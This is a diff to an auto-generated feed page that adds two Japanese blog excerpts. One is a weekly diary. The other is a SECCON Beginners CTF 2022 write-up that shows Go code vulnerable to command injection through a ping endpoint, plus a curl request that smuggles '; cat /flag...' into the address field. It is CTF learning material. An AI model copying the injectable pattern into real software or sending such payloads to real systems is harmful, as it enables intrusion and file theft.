@@ -16,6 +16,77 @@
   <body>
     <!-- %after-body-begin.html% -->
       <section class="daily-content">
+        <h2 class="daily-heading"><time datetime="2022-06-06">2022-06-06</time></h2>
+        <ul class="sources card">
+            <li class="source">
+              <section>
+                <h3 class="source-name"><a class="source-name__link" href="https://kotatsugame.hatenablog.com/" target="_blank" rel="noreferrer noopener">kotatsugameの日記</a></h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details class="article-expander" open>
+                        <summary class="article-expander__title">週記（2022/05/30-2022/06/05）</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://kotatsugame.hatenablog.com/entry/2022/06/06/092127 "target="_blank" rel="noreferrer noopener">
+                          <div class="article-summary-box-inner">
+                            <span>05/30(月) 日曜日は週記を投稿してからすぐ布団に入り、少しYouTubeを見て午前9時前に寝た。 いい感じの時間に起きて少し進捗を生んでからインターン先定例会に出席しようと思って、午後2時から30分おきに目覚ましをかけていた。一応意識は取り戻すものの布団から身を起こすことができずまたすぐ寝入ってしまい、気づいた時には午後4時半になっていた。飛び起きてオンライン会議に接続。ギリギリセーフだった。 先週の進捗は、ない。集中講義だったということで許してもらえないだろうか。そもそも自分で自分を許すべきではない気もする。これまで書いたコードが今、デプロイされたことによって自分の手を離れたところで動…</span>
+                          </div>
+                          <img src="https://ogimage.blog.st-hatena.com/17391345971631198868/13574176438097501383/1654474887" loading="lazy" class="card article-thumbnail" />
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+        </ul>
+      </section>
+      <section class="daily-content">
+        <h2 class="daily-heading"><time datetime="2022-06-05">2022-06-05</time></h2>
+        <ul class="sources card">
+            <li class="source">
+              <section>
+                <h3 class="source-name"><a class="source-name__link" href="https://naari.hatenablog.com/" target="_blank" rel="noreferrer noopener">名有りさんの日記</a></h3>
+                <section class="articles-per-source">
+                    <article>
+                      <details class="article-expander" open>
+                        <summary class="article-expander__title">SECCON Beginners CTF 2022 Write-up</summary>
+                        <a class="article-summary-link article-summary-box-outer" href="https://naari.hatenablog.com/entry/2022/06/05/224238 "target="_blank" rel="noreferrer noopener">
+                          <div class="article-summary-box-inner">
+                            <span>あ
+数年ぶりにCTFをやりたい気持ちになって、身内のSlackで「なんかやりたい」って言ったらいつの間にか参加が確定していた。
+突然投げられたチーム登録用パスワード
+Web
+Util
+pingを投げる対象にコマンドインジェクションできる部分があった。
+   r.POST(&quot;/util/ping&quot;, func(c *gin.Context) {
+        var param IP
+        if err :&#x3D; c.Bind(¶m); err !&#x3D; nil {
+            c.JSON(400, gin.H{&quot;message&quot;: &quot;Invalid parameter&quot;})
+            return
+        }
+
+        commnd :&#x3D; &quot;ping -c 1 -W 1 &quot; + param.Address + &quot; 1&gt;&amp;2&quot;
+        result, _ :&#x3D; exec.Command(&quot;sh&quot;, &quot;-c&quot;, commnd).CombinedOutput()
+
+        c.JSON(200, gin.H{
+            &quot;result&quot;: string(result),
+        })
+    })
+
+
+
+ただ、これを受け取るフロントではIPアドレスらしき値以外はすべて弾く処理が入っていたので、curlあたりで雑にリクエストを投げ、終了。
+$ curl &#x27;https://util.quals.beginners.seccon.jp/util/ping&#x27; -H &#x27;Content-Type: application/json&#x27; --data-raw &#x27;{&quot;address&quot;:&quot;127.0.0.1; cat /flag_A74FIBkN9sELAjOc.txt&quot;}&#x27;
+// &#x3D;&gt; {&quot;result&quot;…</span>
+                          </div>
+                          <img src="https://cdn-ak.f.st-hatena.com/images/fotolife/n/naari_3/20220605/20220605223836.png" loading="lazy" class="card article-thumbnail" />
+                        </a>
+                      </details>
+                    </article>
+                </section>
+              </section>
+            </li>
+        </ul>
+      </section>
+      <section class="daily-content">
         <h2 class="daily-heading"><time datetime="2022-06-04">2022-06-04</time></h2>
         <ul class="sources card">
             <li class="source">
@@ -1556,7 +1627,7 @@ The post [多項式・形式的べき級数] 高速に計算できるものた�
       </section>
 
     <footer>
-      <time id="build-timestamp" datetime="2022-06-05T12:33:35.063Z">2022-06-05T12:33:35.063Z</time>
+      <time id="build-timestamp" datetime="2022-06-06T01:54:08.299Z">2022-06-06T01:54:08.299Z</time>
       <a class="footer-link" href="https://github.com/osmoscraft/osmosfeed">osmosfeed 1.14.4</a>
     </footer>
     <script src="index.js"></script>
